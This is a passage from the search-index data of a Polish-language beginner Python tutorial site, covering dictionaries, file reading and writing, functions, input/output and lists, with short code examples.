s\u0142ownika","text":"<p>Zawarto\u015b\u0107 s\u0142ownika mo\u017cemy wygenerowa\u0107 automatycznie u\u017cywaj\u0105c tzw. dictionary comprehension.</p> <pre><code>numbers_dict = {i: i ** 2 for i in range(10)}\n</code></pre> <p>Mo\u017cemy tak\u017ce u\u017cy\u0107 instrukcji warunkowej, by uwzgl\u0119dni\u0107 jedynie cz\u0119\u015b\u0107 element\u00f3w.</p> <pre><code>even_dict = {i: i ** 2 for i in range(10) if i % 2 == 0}\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#podstawowe-operacje","title":"Podstawowe operacje","text":"<p>Jak to ze strukturami danych bywa, mo\u017cemy nie tylko je tworzy\u0107, ale tak\u017ce operowa\u0107 na ich zawarto\u015bci, co kr\u00f3tko om\u00f3wimy.</p>"},{"location":"programming/python/introduction/dictionaries/#odczytanie-wartosci-pod-zadanym-kluczem","title":"Odczytanie warto\u015bci pod zadanym kluczem","text":"<p>W celu odczytania warto\u015bci zapisanej pod zadanym kluczem u\u017cywamy notacji nawias\u00f3w kwadratowych.</p> <pre><code>print(letters_dict[\"a\"])\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#zmiana-wartosci-pod-zadanym-indeksem","title":"Zmiana warto\u015bci pod zadanym indeksem","text":"<p>Poszczeg\u00f3lne elementy s\u0142ownika mo\u017cemy traktowa\u0107 podobnie do zmiennych, mo\u017cemy wi\u0119c na nich przeprowadza\u0107 standardowe operacje, w szczeg\u00f3lno\u015bci modyfikacj\u0119 warto\u015bci.</p> <pre><code>letters_dict[\"a\"] *= 10\n</code></pre> <p>Nale\u017cy jednak zwr\u00f3ci\u0107 uwag\u0119 na to, \u017ce warto\u015b\u0107, na kt\u00f3rej operujemy w s\u0142owniku, musi najpierw istnie\u0107. Je\u015bli nie, to wyst\u0105pi b\u0142\u0105d. Istnienie warto\u015bci w s\u0142owniku mo\u017cemy sprawdzi\u0107 instrukcj\u0105 warunkow\u0105.</p> <pre><code>if \"a\" in letters_dict:\n    letters_dict[\"a\"] *= 10\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#wypisanie-sownika","title":"Wypisanie s\u0142ownika","text":"<p>W celu wypisania ca\u0142ego s\u0142ownika wystarczy skorzysta\u0107 z wbudowanej funkcji <code>print</code>.</p> <pre><code>print(letters_dict)\n</code></pre> <p>Je\u017celi chcemy wypisa\u0107 wy\u0142\u0105cznie klucze, mo\u017cemy skorzysta\u0107 z metody <code>keys</code>.</p> <pre><code>print(letters_dict.keys())\n</code></pre> <p>Podobnie mo\u017cemy post\u0105pi\u0107 z warto\u015bciami.</p> <pre><code>print(letters_dict.values())\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#pobranie-dugosci-sownika","title":"Pobranie d\u0142ugo\u015bci s\u0142ownika","text":"<p>D\u0142ugo\u015b\u0107 s\u0142ownika, tzn. liczb\u0119 element\u00f3w (kluczy) zapisanych w s\u0142owniku, mo\u017cemy pobra\u0107 za pomoc\u0105 funkcji <code>len</code>, jako parametr podaj\u0105c s\u0142ownik, kt\u00f3rego d\u0142ugo\u015b\u0107 chcemy pozna\u0107.</p> <pre><code>length = len(letters_dict)\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#modyfikacja-zawartosci-sownika","title":"Modyfikacja zawarto\u015bci s\u0142ownika","text":"<p>Poniewa\u017c s\u0142ownik jest struktur\u0105 dynamiczn\u0105, mo\u017cemy do niego swobodnie dodawa\u0107 nowe elementy, a tak\u017ce je usuwa\u0107.</p>"},{"location":"programming/python/introduction/dictionaries/#dodanie-elementu-do-sownika","title":"Dodanie elementu do s\u0142ownika","text":"<p>W celu dodania nowego elementu do s\u0142ownika, wystarczy przypisa\u0107 warto\u015b\u0107 do nowego klucza korzystaj\u0105c z notacji nawias\u00f3w kwadratowych.</p> <pre><code>letters_dict[\"z\"] = 26\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#usuniecie-klucza-ze-sownika","title":"Usuni\u0119cie klucza ze s\u0142ownika","text":"<p>Aby usun\u0105\u0107 wybrany klucz ze s\u0142ownika (i przypisan\u0105 do niego warto\u015b\u0107) mo\u017cemy skorzysta\u0107 z funkcji del.</p> <pre><code>del letters_dict[\"z\"]\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#przechodzenie-po-sowniku","title":"Przechodzenie po s\u0142owniku","text":""},{"location":"programming/python/introduction/dictionaries/#iteracja-po-elementach-sownika","title":"Iteracja po elementach s\u0142ownika","text":"<p>W celu przej\u015bcia po kolejnych elementach s\u0142ownika mo\u017cemy skorzysta\u0107 z p\u0119tli <code>for in</code>. W ten spos\u00f3b przejdziemy po kluczach s\u0142ownika. Je\u017celi chcemy odczyta\u0107 tak\u017ce warto\u015bci, mo\u017cemy skorzysta\u0107 z notacji nawias\u00f3w kwadratowych.</p> <pre><code>for letter in lettes_dict:\n    print(letter, letters_dict[letter])\n</code></pre> <p>Alternatywnie mo\u017cemy tak\u017ce przej\u015b\u0107 bezpo\u015brednio po parach klucz-warto\u015b\u0107 korzystaj\u0105c z metody <code>items</code> aby pobra\u0107 wszystkie elementy s\u0142ownika w postaci krotek (tuple).</p> <pre><code>for letter, value in letters_dict.items():\n    print(letter, value)\n</code></pre>"},{"location":"programming/python/introduction/dictionaries/#sownik-z-wartoscia-domyslna","title":"S\u0142ownik z warto\u015bci\u0105 domy\u015bln\u0105","text":"<p>Klasyczny s\u0142ownik w Pythonie nie ma warto\u015bci domy\u015blnej. Oznacza to, \u017ce jak spr\u00f3bujemy si\u0119 odwo\u0142a\u0107 do klucza, kt\u00f3ry nie zosta\u0142 do s\u0142ownika dodany, to zako\u0144czy si\u0119 to b\u0142\u0119dem.</p> <pre><code>letters_dict = dict()\n\nprint(letters_dict[\"a\"])\n</code></pre> <p>Mo\u017cemy jednak skorzysta\u0107 ze struktury <code>defaultdict</code> z biblioteki <code>collections</code>. Ta struktura przyjmuje w konstruktorze funkcj\u0119, kt\u00f3ra b\u0119dzie wykonywana w przypadku, gdy odwo\u0142amy si\u0119 do nieistniej\u0105cego w s\u0142owniku klucza. Jako funkcj\u0119 mo\u017cemy poda\u0107 np. <code>int</code>. W\u00f3wczas domy\u015bln\u0105 warto\u015bci\u0105 dla nieistniej\u0105cego klucza b\u0119dzie zero. Podobnie by\u0142oby np. z <code>list</code>, w\u00f3wczas domy\u015bln\u0105 warto\u015bci\u0105 b\u0119dzie pusta lista.</p> <pre><code>from collections import defaultdict\n\nletters_dict = defaultdict(int)\n\nprint(letters_dict[\"a\"])  # Wypisze 0\n</code></pre>"},{"location":"programming/python/introduction/files/","title":"Pliki","text":"<p>Obs\u0142uga plik\u00f3w w j\u0119zyku Python jest stosunkowo prosta. Wystarczy otworzy\u0107 plik poleceniem <code>open</code>, wykona\u0107 na nim stosowne operacje, a nast\u0119pnie zamkn\u0105\u0107 plik metod\u0105 <code>close</code>.</p> <pre><code>data_file = open(\"plik.txt\")\n# Operacje na pliku\ndata_file.close()\n</code></pre> <p>Plik mo\u017cemy otwiera\u0107 w r\u00f3\u017cnych trybach, np. do odczytu (read), do zapisu (write), do dopisywania (append). Domy\u015blnie plik otwierany jest w trybie do odczytu, mo\u017cemy jednak to zmieni\u0107 podaj\u0105c jako drugi parametr pierwsz\u0105 liter\u0119 po\u017c\u0105danego trybu.</p> <pre><code>data_file = open(\"plik.txt\", \"w\")  # Plik otwarty w trybie do zapisu\n# Operacje na pliku\ndata_file.close()\n</code></pre> <p>Pami\u0119tanie o zamkni\u0119ciu pliku mo\u017ce by\u0107 k\u0142opotliwe, a je\u017celi tego nie zrobimy, to plik mo\u017ce zosta\u0107 uszkodzony. Na szcz\u0119\u015bcie mo\u017cemy skorzysta\u0107 z czego\u015b, co nazywa si\u0119 kontekstem. W Pythonie mo\u017cemy pracowa\u0107 w danym kontek\u015bcie za pomoc\u0105 polecenia <code>with</code>. Sp\u00f3jrzmy na poni\u017cszy przyk\u0142ad, by lepiej zrozumie\u0107 dzia\u0142anie tego polecenia.</p> <pre><code>with open(\"plik.txt\") as data_file:\n    # Operacje na pliku\n</code></pre> <p>Plik zostanie zamkni\u0119ty wraz z wyj\u015bciem z zakresu polecenia <code>with</code>, wi\u0119c nie musimy ju\u017c zawraca\u0107 sobie tym g\u0142owy.</p>"},{"location":"programming/python/introduction/files/#czytanie-danych-z-pliku","title":"Czytanie danych z pliku","text":"<p>Odczytywanie danych z pliku tekstowego mo\u017cemy zrealizowa\u0107 na kilka sposob\u00f3w. Jednym z nich jest przeiterowanie po ca\u0142ym pliku za pomoc\u0105 p\u0119tli <code>for</code>. W ten spos\u00f3b mo\u017cemy \u0142atwo odczyta\u0107 ka\u017cd\u0105 lini\u0119 z pliku. Nale\u017cy jednak pami\u0119ta\u0107, \u017ce odczytana linia b\u0119dzie zawiera\u0142a znak ko\u0144ca linii.</p> <pre><code>with open(\"plik.txt\") as data_file:\n    for line in data_file:\n        # Operacje na linii z pliku\n</code></pre> <p>Mo\u017cemy tak\u017ce wczyta\u0107 wszystkie linie z pliku w postaci listy za pomoc\u0105 metody <code>readlines</code>. Tutaj tak\u017ce ka\u017cdy element b\u0119dzie zawiera\u0142 znak ko\u0144ca linii.</p> <pre><code>with open(\"plik.txt\") as data_file:\n    lines_list = data_file.readlines()\n</code></pre> <p>Innym rozwi\u0105zaniem jest wczytanie zawarto\u015bci ca\u0142ego pliku w postaci jednego, d\u0142ugiego tekstu. W tym celu skorzystamy z metody <code>read</code>.</p> <pre><code>with open(\"plik.txt\") as data_file:\n    file_content = data_file.read()\n</code></pre>"},{"location":"programming/python/introduction/files/#pisanie-do-pliku","title":"Pisanie do pliku","text":"<p>Jednym ze sposob\u00f3w na zapisanie danych do pliku jest skorzystanie z metody <code>write</code>. Nale\u017cy jednak pami\u0119ta\u0107, \u017ce ta metoda nie dodaje automatycznie znaku ko\u0144ca linii.</p> <pre><code>with open(\"plik.txt\", \"w\") as data_file:\n    data_file.write(\"Hello World!\")\n</code></pre> <p>Mo\u017cemy tak\u017ce skorzysta\u0107 z popularnej funkcji <code>print</code> przekazuj\u0105c do niej nasz plik w postaci dodatkowego parametru <code>file</code>.</p> <pre><code>with open(\"plik.txt\", \"w\") as data_file:\n    print(\"Hello World!\", file=data_file)\n</code></pre>"},{"location":"programming/python/introduction/functions/","title":"Funkcje","text":"<p>W j\u0119zyku Python funkcje definiujemy zaczynaj\u0105c od s\u0142owa kluczowego <code>def</code>, po kt\u00f3rym nast\u0119puje nazwa funkcji, lista parametr\u00f3w oddzielonych przecinkiem podanych w okr\u0105g\u0142ych nawiasach, a nast\u0119pnie dwukropek oznaczaj\u0105cy pocz\u0105tek bloku cia\u0142a funkcji.</p>"},{"location":"programming/python/introduction/functions/#przykad","title":"Przyk\u0142ad","text":"<pre><code>def suma(a, b):\n    return a + b\n</code></pre>"},{"location":"programming/python/introduction/functions/#sugestie-typow","title":"Sugestie typ\u00f3w","text":"<p>Tak jak i przy definicji zmiennych, tak samo przy tworzeniu funkcji mo\u017cemy doda\u0107 sugestie typ\u00f3w, zar\u00f3wno dla argument\u00f3w jak i zwracanej warto\u015bci.</p>"},{"location":"programming/python/introduction/functions/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>def suma(a: int, b: int) -&gt; int:\n    return a + b\n</code></pre>"},{"location":"programming/python/introduction/functions/#procedury","title":"Procedury","text":"<p>W Pythonie nie odr\u00f3\u017cniamy procedur od funkcji, ale oczywi\u015bcie mo\u017cemy tworzy\u0107 funkcje, kt\u00f3re nie zwracaj\u0105 warto\u015bci.</p>"},{"location":"programming/python/introduction/functions/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>def powitanie(imie: str):\n    print(f\"Witaj {imie}!\")\n</code></pre>"},{"location":"programming/python/introduction/input-output/","title":"Obs\u0142uga wej\u015bcia i wyj\u015bcia","text":""},{"location":"programming/python/introduction/input-output/#wyjscie","title":"Wyj\u015bcie","text":"<p>Wypisanie prostego komunikatu:</p> <pre><code>print(\"Witaj \u015awiecie!\")\n</code></pre>"},{"location":"programming/python/introduction/input-output/#tekst-formatowany","title":"Tekst formatowany","text":"<p>Gdy chcemy w komunikacie umie\u015bci\u0107 warto\u015bci zmiennych, naj\u0142atwiej jest to zrobi\u0107 u\u017cywaj\u0105c tekstu formatowanego. W tym celu przed cudzys\u0142owem umieszczamy liter\u0119 <code>f</code>, a w samym tek\u015bcie u\u017cywamy nawias\u00f3w klamrowych w miejscach, gdzie chcemy wstawi\u0107 warto\u015bci zmiennych.</p>"},{"location":"programming/python/introduction/input-output/#przykad","title":"Przyk\u0142ad","text":"<pre><code>temp = 10\n\nprint(f\"Dzisiaj jest {temp} stopni Celsjusza\")\n</code></pre>"},{"location":"programming/python/introduction/input-output/#formatowanie-liczb-rzeczywistych","title":"Formatowanie liczb rzeczywistych","text":"<p>Cz\u0119sto wypisuj\u0105c liczb\u0119 rzeczywist\u0105 potrzebujemy zobaczy\u0107 okre\u015blon\u0105 liczb\u0119 cyfr po przecinku. W tym celu mo\u017cemy skorzysta\u0107 z dodatkowych opcji tekstu formatowanego, podawanych po dwukropku po zmiennej zamkni\u0119tej w nawiasach klamrowych. Np. je\u017celi chcemy wypisa\u0107 liczb\u0119 rzeczywist\u0105 z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku, to napiszemy <code>:.2f</code>. Kropka okre\u015bla warto\u015bci po przecinku, \\(2\\) to liczba cyfr, kt\u00f3re chcemy wypisa\u0107, a f okre\u015bla format rzeczywisty (float).</p>"},{"location":"programming/python/introduction/input-output/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>temp = 9.79347832\n\nprint(f\"Dzisiaj jest {temp:.2f} stopni Celsjusza\")\n</code></pre>"},{"location":"programming/python/introduction/input-output/#wejscie","title":"Wej\u015bcie","text":""},{"location":"programming/python/introduction/input-output/#wczytanie-tekstu","title":"Wczytanie tekstu","text":"<pre><code>name = input(\"Podaj swoje imie: \")\n</code></pre> <p>Jak wida\u0107 na powy\u017cszym przyk\u0142adzie, do wczytania tekstu od u\u017cytkownika s\u0142u\u017cy funkcja <code>input()</code>. Do funkcji mo\u017cemy przekaza\u0107 opcjonalny parametr: tekst, jaki zostanie wy\u015bwietlony u\u017cytkownikowi. Jako wynik funkcja zwraca ca\u0142\u0105 lini\u0119 tekstu wczytan\u0105 z wej\u015bcia.</p>"},{"location":"programming/python/introduction/input-output/#wczytanie-liczby","title":"Wczytanie liczby","text":"<p>Za pomoc\u0105 funkcji <code>input()</code> mo\u017cemy wczyta\u0107 lini\u0119 tekstu z konsoli. Je\u017celi chcemy, aby u\u017cytkownik poda\u0142 nam liczb\u0119, to nie mo\u017cemy tego co prawda wymusi\u0107, ale mo\u017cemy przetworzy\u0107 wczytany tekst na liczb\u0119 za pomoc\u0105 funkcji <code>int()</code>.</p>"},{"location":"programming/python/introduction/input-output/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>age = int(input(\"Podaj sw\u00f3j wiek: \"))\n</code></pre>"},{"location":"programming/python/introduction/input-output/#wczytanie-dwoch-wyrazow-z-jednej-linii","title":"Wczytanie dw\u00f3ch wyraz\u00f3w z jednej linii","text":"<p>Za pomoc\u0105 polecenia <code>input</code> wczytujemy ca\u0142\u0105 lini\u0119 tekstu. Je\u017celi wi\u0119c w linii podane b\u0119d\u0105 dwa wyrazy rozdzielone spacj\u0105, to wczytamy je oba razem ze spacj\u0105 w formie jednego tekstu. Zazwyczaj jednak chcemy mie\u0107 ka\u017cdy wyraz zapisany w osobnej zmiennej. W tym celu mo\u017cemy skorzysta\u0107 z funkcji <code>split</code>, kt\u00f3ra dzieli tekst na fragmenty. Podzia\u0142 wykonywany jest na podstawie podanego ogranicznika tekstu. Domy\u015blnym ogranicznikiem jest znak spacji.</p>"},{"location":"programming/python/introduction/input-output/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>w1, w2 = input(\"Podaj dwa wyrazy oddzielone spacj\u0105: \").split()\n</code></pre>"},{"location":"programming/python/introduction/input-output/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>w1, w2 = input(\"Podaj dwa wyrazy oddzielone przecinkiem: \").split(\",\")\n</code></pre>"},{"location":"programming/python/introduction/input-output/#wczytanie-dwoch-liczb-z-jednej-linii","title":"Wczytanie dw\u00f3ch liczb z jednej linii","text":"<p>Wczytanie dw\u00f3ch wyraz\u00f3w z jednej linii jest proste, co jednak gdy zamiast wyraz\u00f3w mamy liczby? W\u00f3wczas musimy dokona\u0107 konwersji za pomoc\u0105 odpowiedniej funkcji, np. <code>int</code>. Mo\u017cemy to zrobi\u0107 r\u0119cznie, tzn. najpierw wczyta\u0107 dwa wyrazy, a potem zamieni\u0107 je na liczby. Istnieje jednak inny, zautomatyzowany spos\u00f3b. Mo\u017cemy skorzysta\u0107 z funkcji <code>map</code>. Funkcja ta przyjmuje dwa argumenty: funkcj\u0119 oraz zbi\u00f3r, a jej efektem jest zastosowanie podanej funkcji na ka\u017cdym elemencie podanego zbioru. Dzi\u0119ki temu mo\u017cemy zastosowa\u0107 funkcj\u0119 <code>int</code> na ka\u017cdym wczytanym wyrazie.</p>"},{"location":"programming/python/introduction/input-output/#przykad_3","title":"Przyk\u0142ad","text":"<pre><code>num1, num2 = map(int, input(\"Podaj dwie liczby ca\u0142kowite oddzielone spacj\u0105: \").split())\n</code></pre>"},{"location":"programming/python/introduction/input-output/#wczytanie-listy-wyrazow-z-jednej-linii","title":"Wczytanie listy wyraz\u00f3w z jednej linii","text":"<p>Nie zawsze wiemy, ile element\u00f3w b\u0119dzie podanych w jednej linii, ale to \u017caden problem. Polecenie split zwraca nam list\u0119 wyraz\u00f3w, z kt\u00f3rej mo\u017cemy skorzysta\u0107.</p>"},{"location":"programming/python/introduction/input-output/#przykad_4","title":"Przyk\u0142ad","text":"<pre><code>words_list = input(\"Podaj wyrazy oddzielone spacj\u0105: \").split()\n</code></pre>"},{"location":"programming/python/introduction/input-output/#wczytanie-listy-liczb-z-jednej-linii","title":"Wczytanie listy liczb z jednej linii","text":"<p>Wczytanie listy liczb jest bardzo podobne do wczytania dw\u00f3ch liczb z jednej linii. Tym razem jednak chcemy mie\u0107 list\u0119. Polecenie <code>map</code> nie zwraca nam listy jako wynik, wi\u0119c sami przekonwertujemy wynik polecenia na list\u0119 za pomoc\u0105 funkcji <code>list</code>.</p>"},{"location":"programming/python/introduction/input-output/#przykad_5","title":"Przyk\u0142ad","text":"<pre><code>num_list = list(map(int, input(\"Podaj wyrazy oddzielone spacj\u0105: \").split()))\n</code></pre>"},{"location":"programming/python/introduction/lists/","title":"Listy","text":"<p>Listy w j\u0119zyku Python s\u0105 podstawow\u0105 struktur\u0105 dynamiczn\u0105 s\u0142u\u017c\u0105c\u0105 do przechowywania wielu warto\u015bci.</p> <p>Info</p> <p>Elementy listy indeksujemy (numerujemy) od \\(0\\).</p>"},{"location":"programming/python/introduction/lists/#inicjalizacja-listy","title":"Inicjalizacja listy","text":"<p>W j\u0119zyku Python nowe listy s\u0105 domy\u015blnie puste. Mo\u017cemy je wype\u0142ni\u0107 pocz\u0105tkowymi warto\u015bciami, ale nie mo\u017cemy im nada\u0107 pocz\u0105tkowego rozmiaru. Instrukcja <code>lista = [10]</code> oznacza utworzenie listy z jednym elementem: liczb\u0105 10, a nie utworzenie listy o rozmiarze 10, jak mo\u017cna pomy\u015ble\u0107 na podstawie j\u0119zyka C++.</p> <p>Jest jednak spos\u00f3b na utworzenie listy o okre\u015blonym rozmiarze: poprzez wype\u0142nienie jej pocz\u0105tkowymi warto\u015bciami. Mo\u017cemy to oczywi\u015bcie zrobi\u0107 w p\u0119tli, ale Python daje nam prostsz\u0105 i wydajniejsz\u0105 konstrukcj\u0119 tworzenia list: list comprehension.</p>"},{"location":"programming/python/introduction/lists/#pusta-lista","title":"Pusta lista","text":"<p>W celu utworzenia pustej listy wystarczy jako warto\u015b\u0107 zmiennej przypisa\u0107 puste nawiasy kwadratowe.</p> <pre><code>tab = []\n</code></pre>"},{"location":"programming/python/introduction/lists/#inicjalizacja-danymi-poczatkowymi","title":"Inicjalizacja danymi pocz\u0105tkowymi","text":"<p>Gdy tworzymy list\u0119, to nie podajemy jej d\u0142ugo\u015bci. Mo\u017cemy j\u0105 jednak wype\u0142ni\u0107 warto\u015bciami. W\u00f3wczas lista b\u0119dzie mia\u0142a d\u0142ugo\u015b\u0107 r\u00f3wn\u0105 liczbie podanych warto\u015bci.</p> <pre><code>tab = [1, 2, 3, 4, 5]\n</code></pre>"},{"location":"programming/python/introduction/lists/#lista-o-dugosci-zadanej-przez-zmienna","title":"Lista o d\u0142ugo\u015bci zadanej przez zmienn\u0105","text":"<p>Nie mo\u017cemy poda\u0107, ile element\u00f3w ma mie\u0107 lista, mo\u017cemy j\u0105 jednak wygenerowa\u0107 u\u017cywaj\u0105c tzw. list comprehension.</p> <pre><code>n = 10\ntab = [0 for _ in range(n)]\n</code></pre>"},{"location":"programming/python/introduction/lists/#utworzenie-dziesiecio-elementowej-listy-wypenionej-zerami","title":"Utworzenie dziesi\u0119cio-elementowej listy wype\u0142nionej zerami","text":"<pre><code>lista = [0 for _ in range(10)]\n</code></pre>"},{"location":"programming/python/introduction/lists/#utworzenie-dziesiecio-elementowej-listy-wypenionej-kolejnymi-wartosciami-od-0-do-9-wacznie","title":"Utworzenie dziesi\u0119cio-elementowej listy wype\u0142nionej kolejnymi warto\u015bciami od 0 do 9 w\u0142\u0105cznie","text":"<pre><code>lista = [i for i in range(10)]\n</code></pre>"},{"location":"programming/python/introduction/lists/#utworzenie-listy-z-tekstu","title":"Utworzenie listy z tekstu","text":"<pre><code>tekst = \"a b c d e f\"\nlista = tekst.split(\" \") # [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\"]\n</code></pre>"},{"location":"programming/python/introduction/lists/#podstawowe-operacje","title":"Podstawowe operacje","text":"<p>Jak to z listami bywa, mo\u017cemy nie tylko je tworzy\u0107, ale tak\u017ce operowa\u0107 na ich zawarto\u015bci, co kr\u00f3tko om\u00f3wimy.</p>"},{"location":"programming/python/introduction/lists/#odczytanie-wartosci-pod-zadanym-indeksem","title":"Odczytanie warto\u015bci pod zadanym indeksem","text":"<p>W celu odczytania warto\u015bci zapisanej pod zadanym indeksem u\u017cywamy notacji nawias\u00f3w kwadratowych.</p> <pre><code>print(tab[2])\n</code></pre>"},{"location":"programming/python/introduction/lists/#ujemne-indeksy","title":"Ujemne indeksy","text":"<p>Standardowo, by dosta\u0107\u00a0si\u0119 do zadanego elementu listy, podajemy jego indeks licz\u0105c od pocz\u0105tku listy. Mo\u017cemy te\u017c jednak liczy\u0107 odleg\u0142o\u015b\u0107 od ko\u0144ca listy. Wtedy korzystamy z ujemnych indeks\u00f3w, gdzie \\(-1\\) oznacza ostatni element listy, \\(-2\\) przedostatni itd.</p> <pre><code>print(tab[-1])\n</code></pre>"},{"location":"programming/python/introduction/lists/#zmiana-wartosci-pod-zadanym-indeksem","title":"Zmiana warto\u015bci pod zadanym indeksem","text":"<p>Poszczeg\u00f3lne elementy listy mo\u017cemy traktowa\u0107 podobnie do zmiennych, mo\u017cemy wi\u0119c na nich przeprowadza\u0107 standardowe operacje, w szczeg\u00f3lno\u015bci przypisanie nowej warto\u015bci.</p> <pre><code>tab[2] = 10\n</code></pre>"},{"location":"programming/python/introduction/lists/#wypisanie-listy","title":"Wypisanie listy","text":"<p>W celu wypisania ca\u0142ej listy wystarczy skorzysta\u0107 z wbudowanej funkcji <code>print</code>.</p> <pre><code>print(tab)\n</code></pre>"},{"location":"programming/python/introduction/lists/#pobranie-dugosci-listy","title":"Pobranie d\u0142ugo\u015bci listy","text":"<p>D\u0142ugo\u015b\u0107 listy, tzn. liczb\u0119 element\u00f3w zapisanych w li\u015bcie, mo\u017cemy pobra\u0107 za pomoc\u0105 funkcji <code>len</code>, jako parametr podaj\u0105c list\u0119, kt\u00f3rej d\u0142ugo\u015b\u0107 chcemy pozna\u0107.</p> <pre><code>length = len(tab)\n\nprint(length)\n</code></pre>"},{"location":"programming/python/introduction/lists/#modyfikacja-zawartosci-listy","title":"Modyfikacja zawarto\u015bci listy","text":"<p>Poniewa\u017c lista jest struktur\u0105 dynamiczn\u0105, mo\u017cemy do niej swobodnie dodawa\u0107 nowe elementy, a tak\u017ce je usuwa\u0107.</p>"},{"location":"programming/python/introduction/lists/#dodanie-elementu-do-listy","title":"Dodanie elementu do listy","text":"<p>W celu dodania nowej warto\u015bci na koniec listy u\u017cywamy metody <code>append</code>, jako argument podaj\u0105c warto\u015b\u0107 nowego elementu.</p> <pre><code>tab.append(45)\n</code></pre>"},{"location":"programming/python/introduction/lists/#usuniecie-ostatniego-elementu-z-listy","title":"Usuni\u0119cie ostatniego elementu z listy","text":"<p>Aby usun\u0105\u0107 ostatni element listy mo\u017cemy skorzysta\u0107 z metody pop nie podaj\u0105c do niej \u017cadnych argument\u00f3w.</p>"},{"location":"programming/python/introduction/lists/#przykad","title":"Przyk\u0142ad","text":"<pre><code>tab = [1, 2, 3, 4]\ntab.pop()\nprint(tab)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik","title":"Wynik","text":"<pre><code>[1, 2, 3]\n</code></pre>"},{"location":"programming/python/introduction/lists/#usuniecie-i-tego-elementu-z-listy","title":"Usuni\u0119cie i-tego elementu z listy","text":"<p>Do metody pop mo\u017cemy tak\u017ce jako argument poda\u0107 indeks elementu do usuni\u0119cia z listy.</p>"},{"location":"programming/python/introduction/lists/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>tab = [1, 2, 3, 4]\ntab.pop(2)\nprint(tab)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_1","title":"Wynik","text":"<pre><code>[1, 2, 4]\n</code></pre>"},{"location":"programming/python/introduction/lists/#przechodzenie-po-liscie","title":"Przechodzenie po li\u015bcie","text":""},{"location":"programming/python/introduction/lists/#iteracja-po-elementach-listy","title":"Iteracja po elementach listy","text":"<p>W celu przej\u015bcia po kolejnych elementach listy mo\u017cemy skorzysta\u0107 z p\u0119tli <code>for in</code>.</p>"},{"location":"programming/python/introduction/lists/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>tab = [1, 2, 3, 4, 5]\nfor el in tab:\n    print(el)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_2","title":"Wynik","text":"<pre><code>1\n2\n3\n4\n5\n</code></pre>"},{"location":"programming/python/introduction/lists/#iteracja-po-indeksach-listy","title":"Iteracja po indeksach listy","text":"<p>Je\u017celi chcemy przej\u015b\u0107 p\u0119tl\u0105 wy\u0142\u0105cznie po indeksach, mo\u017cemy np. skorzysta\u0107 z funkcji <code>range</code> jako argument podaj\u0105\u0107 d\u0142ugo\u015b\u0107 listy pobran\u0105 za pomoc\u0105 funckji <code>len</code>.</p>"},{"location":"programming/python/introduction/lists/#przykad_3","title":"Przyk\u0142ad","text":"<pre><code>tab = [1, 2, 3, 4, 5]\nfor ind in range(len(tab)):\n    print(tab[ind])\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_3","title":"Wynik","text":"<pre><code>1\n2\n3\n4\n5\n</code></pre>"},{"location":"programming/python/introduction/lists/#iteracja-po-elementach-i-indeksach","title":"Iteracja po elementach i indeksach","text":"<p>Je\u017celi chcemy jednocze\u015bnie przej\u015b\u0107 po indeksach element\u00f3w i ich warto\u015bciach, mo\u017cemy skorzysta\u0107 z funkcji <code>enumerate</code>, do kt\u00f3rej jako argument podajemy nasz\u0105 list\u0119.</p>"},{"location":"programming/python/introduction/lists/#przykad_4","title":"Przyk\u0142ad","text":"<pre><code>tab = [1, 2, 3, 4, 5]\nfor ind, el in enumerate(tab):\n    print(ind, el)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_4","title":"Wynik","text":"<pre><code>0 1\n1 2\n2 3\n3 4\n4 5\n</code></pre>"},{"location":"programming/python/introduction/lists/#kopiowanie-listy","title":"Kopiowanie listy","text":"<p>Podczas przypisywania listy do innej zmiennej trzeba zachowa\u0107 ostro\u017cno\u015b\u0107, poniewa\u017c domy\u015blnie lista przekazywana jest przez referencj\u0119. Sp\u00f3jrzmy na poni\u017cszy przyk\u0142ad, aby zrozumie\u0107, co to oznacza.</p>"},{"location":"programming/python/introduction/lists/#przykad_5","title":"Przyk\u0142ad","text":"<pre><code>tab1 = [1, 2, 3, 4]\ntab2 = tab1\n\ntab2[0] = 25\n\nprint(tab1)\nprint(tab2)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_5","title":"Wynik","text":"<pre><code>[25, 2, 3, 4]\n[25, 2, 3, 4]\n</code></pre> <p>Info</p> <p>Na pocz\u0105tku tworzymy now\u0105 list\u0119 i zapisujemy j\u0105 w zmiennej <code>tab1</code>. Nast\u0119pnie warto\u015b\u0107 tej zmiennej przypisujemy do <code>tab2</code>. W kolejnym kroku zmieniamy pierwszy element listy zapisanej w zmiennej <code>tab2</code>. Gdy jednak wypiszemy obie listy oka\u017ce si\u0119, \u017ce warto\u015b\u0107 zosta\u0142a tak\u017ce zmieniona w li\u015bcie zapisanej w zmiennej <code>tab1</code>.</p> <p>Dzieje si\u0119 tak, poniewa\u017c zmienne <code>tab1</code> i <code>tab2</code> wskazuj\u0105 na ten sam obiekt w pami\u0119ci. Gdy chcemy utworzy\u0107 faktyczn\u0105 kopi\u0119 listy, niepowi\u0105zan\u0105 z jej pierwotnym obiektem, mo\u017cemy skorzysta\u0107 z jednej z metod opisanych poni\u017cej.</p>"},{"location":"programming/python/introduction/lists/#pytka-kopia-ang-shallow-copy","title":"P\u0142ytka kopia (ang. shallow copy)","text":"<p>Je\u017celi nasza lista zawiera tylko proste typy, np. liczby, to mo\u017cemy spokojnie skorzysta\u0107 z tzw. p\u0142ytkiej kopii. W tym 